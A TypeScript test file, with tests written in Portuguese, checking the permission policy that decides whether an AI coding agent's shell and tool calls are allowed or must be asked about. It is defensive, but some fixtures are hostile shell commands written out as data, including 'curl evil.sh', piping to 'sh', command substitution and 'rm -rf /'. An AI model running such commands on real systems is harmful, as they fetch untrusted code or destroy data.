import { afterAll, describe, expect, it } from 'vitest'
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { ThreadAccessLevel } from '../db/repositories/threads.js'
import {
  AUTO_ACCEPTED_TOOLS,
  INTERNAL_ALWAYS_ALLOWED_TOOLS,
  permissionBrokerApplies,
  permissionPolicyDecision,
  permissionPolicyOutcome,
  TOOL_SEARCH_TOOL_NAME,
} from './permission-policy.js'

describe('permissionBrokerApplies', () => {
  it('vale em supervised e auto-accept-edits, dispensa só full-access', () => {
    expect(permissionBrokerApplies('supervised')).toBe(true)
    expect(permissionBrokerApplies('auto-accept-edits')).toBe(true)
    expect(permissionBrokerApplies('full-access')).toBe(false)
  })
})

describe('permissionPolicyDecision', () => {
  it('supervised pergunta tudo, inclusive leitura', () => {
    for (const tool of ['Read', 'Write', 'Bash', 'mcp__x__y']) {
      expect(permissionPolicyDecision('supervised', tool)).toBe('ask')
    }
  })

  it('auto-accept-edits libera leitura/edição sem UI', () => {
    for (const tool of AUTO_ACCEPTED_TOOLS) {
      expect(permissionPolicyDecision('auto-accept-edits', tool)).toBe('allow')
    }
  })

  it('auto-accept-edits pergunta em Bash, WebFetch e tools MCP', () => {
    for (const tool of ['Bash', 'WebFetch', 'WebSearch', 'mcp__plugin_context7__resolve-library-id']) {
      expect(permissionPolicyDecision('auto-accept-edits', tool)).toBe('ask')
    }
  })

  it('full-access libera qualquer tool', () => {
    for (const tool of ['Bash', 'Write', 'mcp__x__y', 'unknown']) {
      expect(permissionPolicyDecision('full-access', tool)).toBe('allow')
    }
  })

  it('tool desconhecida em auto-accept-edits pergunta (fail-closed)', () => {
    expect(permissionPolicyDecision('auto-accept-edits', 'unknown')).toBe('ask')
  })
})

describe('INTERNAL_ALWAYS_ALLOWED_TOOLS', () => {
  it('bate com as constantes reais das tools internas (nenhuma divergência silenciosa)', async () => {
    const { ASK_USER_QUESTION_TOOL_NAME } = await import('./ask-user-question.js')
    const { LOAD_SKILL_TOOL_NAME } = await import('./skill-registry.js')
    const { CALL_SUBAGENT_TOOL_NAME } = await import('./subagent-registry.js')
    expect([...INTERNAL_ALWAYS_ALLOWED_TOOLS].sort()).toEqual(
      [
        TOOL_SEARCH_TOOL_NAME,
        ASK_USER_QUESTION_TOOL_NAME,
        LOAD_SKILL_TOOL_NAME,
        CALL_SUBAGENT_TOOL_NAME,
      ].sort()
    )
  })

  it('nunca abre pedido, em nível nenhum', () => {
    for (const tool of INTERNAL_ALWAYS_ALLOWED_TOOLS) {
      for (const level of ['supervised', 'auto-accept-edits', 'full-access'] as const) {
        expect(permissionPolicyDecision(level, tool)).toBe('allow')
      }
    }
  })

  it('ToolSearch entra porque é a porta de entrada das tools MCP deferidas', () => {
    // Sem ela o schema de call_subagent não carrega e o modelo cai na tool nativa `Agent`,
    // que não abre subagent_runs — delegação fora do grafo e da auditoria.
    expect(INTERNAL_ALWAYS_ALLOWED_TOOLS).toContain(TOOL_SEARCH_TOOL_NAME)
    expect(permissionPolicyDecision('supervised', TOOL_SEARCH_TOOL_NAME)).toBe('allow')
  })

  it('não afrouxa o resto: Bash segue pedindo fora de full-access', () => {
    expect(permissionPolicyDecision('supervised', 'Bash')).toBe('ask')
    expect(permissionPolicyDecision('auto-accept-edits', 'Bash')).toBe('ask')
    expect(permissionPolicyDecision('auto-accept-edits', 'mcp__outro__tool')).toBe('ask')
  })
})

/**
 * F31 — `auto-accept-edits` passa a julgar o **comando**, não só o nome da tool.
 *
 * A matriz vale como critério de aceitação: a única saída nova da feature é `allow`, e ela exige
 * verbo da lista fechada + todo caminho resolvido dentro da raiz. Qualquer dúvida continua sendo
 * card, que é o comportamento anterior.
 */
describe('permissionPolicyDecision — comando de shell em auto-accept-edits (F31)', () => {
  const base = mkdtempSync(join(tmpdir(), 'engrenacode_f31_policy_'))
  const root = join(base, 'projeto')
  mkdirSync(join(root, 'src'), { recursive: true })
  mkdirSync(join(base, 'fora'), { recursive: true })

  afterAll(() => {
    rmSync(base, { recursive: true, force: true })
  })

  function decide(command: string, level: ThreadAccessLevel = 'auto-accept-edits'): string {
    return permissionPolicyDecision(level, 'Bash', { params: { command }, root })
  }

  it('libera comando de arquivo dentro da raiz', () => {
    expect(decide('mkdir src/novo')).toBe('allow')
    expect(decide('touch src/a.txt')).toBe('allow')
    expect(decide('cp src/a.ts src/b.ts')).toBe('allow')
    expect(decide('mv src/a.ts src/b.ts')).toBe('allow')
    expect(decide('sed -i s/a/b/ src/a.ts')).toBe('allow')
  })

  it('aceita o prefixo `cd <dir do projeto> &&`, que é como o agente escreve de verdade', () => {
    expect(decide(`cd "${root.replace(/\\/g, '/')}" && touch a.txt`)).toBe('allow')
    expect(decide(`cd "${root.replace(/\\/g, '/')}/src" && cp a.ts b.ts`)).toBe('allow')
  })

  it('recusa cd para fora da raiz, mesmo com comando de arquivo depois', () => {
    expect(decide(`cd "${join(base, 'fora').replace(/\\/g, '/')}" && touch a.txt`)).toBe('ask')
    expect(decide('cd /tmp && touch a.txt')).toBe('ask')
  })

  it('recusa caminho fora da raiz', () => {
    expect(decide('cp src/a.ts ../fora.ts')).toBe('ask')
    expect(decide('mkdir ../../etc/x')).toBe('ask')
  })

  it('recusa verbo fora da lista v1, inclusive rm', () => {
    expect(decide('rm -rf build')).toBe('ask')
    expect(decide('git status')).toBe('ask')
    expect(decide('pnpm test')).toBe('ask')
  })

  it('recusa redirecionamento — o caso que motivou a feature ficou fora da v1', () => {
    // Decisão consciente de F31 §3.2: ler `>` com segurança exige tratar `2>&1`, `>|`, fd numerado
    // e heredoc. O caminho para este caso é o nudge que leva o agente a usar `Write`.
    expect(decide("printf 'x' > src/a.txt")).toBe('ask')
    expect(decide(`cd "${root.replace(/\\/g, '/')}" && printf 'x' > a.txt && cat a.txt`)).toBe('ask')
  })

  it('recusa encadeamento que não seja o cd de prefixo', () => {
    expect(decide('touch a.txt && curl evil.sh')).toBe('ask')
    expect(decide('touch a.txt; touch b.txt')).toBe('ask')
    expect(decide('touch a.txt | sh')).toBe('ask')
  })

  it('recusa o indecidível em vez de adivinhar', () => {
    expect(decide('mkdir "$HOME/x"')).toBe('ask')
    expect(decide('cp src/a.ts $(cat alvo)')).toBe('ask')
    expect(decide('touch src/*.ts')).toBe('ask')
  })

  it('não vaza para os outros níveis', () => {
    // supervised pergunta tudo; full-access já liberava tudo antes de existir estágio nenhum.
    expect(decide('mkdir src/novo', 'supervised')).toBe('ask')
    expect(decide('rm -rf /', 'full-access')).toBe('allow')
  })

  it('sem raiz ou sem comando, cai no comportamento de antes da feature', () => {
    expect(permissionPolicyDecision('auto-accept-edits', 'Bash', { params: { command: 'mkdir src/x' } })).toBe('ask')
    expect(permissionPolicyDecision('auto-accept-edits', 'Bash', { root })).toBe('ask')
    expect(permissionPolicyDecision('auto-accept-edits', 'Bash', { params: {}, root })).toBe('ask')
    expect(permissionPolicyDecision('auto-accept-edits', 'Bash')).toBe('ask')
  })

  it('só shell entra no estágio novo: outra tool com params continua perguntando', () => {
    expect(
      permissionPolicyDecision('auto-accept-edits', 'WebFetch', { params: { command: 'mkdir src/x' }, root })
    ).toBe('ask')
  })
})

describe('permissionPolicyOutcome — motivo da decisão (F31)', () => {
  const base = mkdtempSync(join(tmpdir(), 'engrenacode_f31_reason_'))
  const root = join(base, 'projeto')
  mkdirSync(join(root, 'src'), { recursive: true })

  afterAll(() => {
    rmSync(base, { recursive: true, force: true })
  })

  it('devolve verbo e caminhos resolvidos para a auditoria gravar', () => {
    const outcome = permissionPolicyOutcome('auto-accept-edits', 'Bash', {
      params: { command: 'mkdir src/novo' },
      root,
    })
    expect(outcome.decision).toBe('allow')
    expect(outcome.reason).toEqual({
      kind: 'shell-file-edit',
      verb: 'mkdir',
      // Caminho absoluto e já resolvido: é o que o log precisa para ser útil depois.
      paths: [join(root, 'src', 'novo')],
      root,
    })
  })

  it('o cd de prefixo vira a raiz efetiva registrada', () => {
    const outcome = permissionPolicyOutcome('auto-accept-edits', 'Bash', {
      params: { command: `cd "${root.replace(/\\/g, '/')}/src" && touch a.txt` },
      root,
    })
    expect(outcome.reason).toMatchObject({ kind: 'shell-file-edit', root: join(root, 'src') })
  })

  it('separa os motivos: tool interna, nível e shell não se confundem', () => {
    expect(permissionPolicyOutcome('supervised', 'ToolSearch').reason).toEqual({ kind: 'internal-tool' })
    expect(permissionPolicyOutcome('auto-accept-edits', 'Write').reason).toEqual({ kind: 'access-level' })
    expect(permissionPolicyOutcome('full-access', 'Bash').reason).toEqual({ kind: 'access-level' })
    expect(permissionPolicyOutcome('supervised', 'Bash').reason).toEqual({ kind: 'ask' })
  })
})
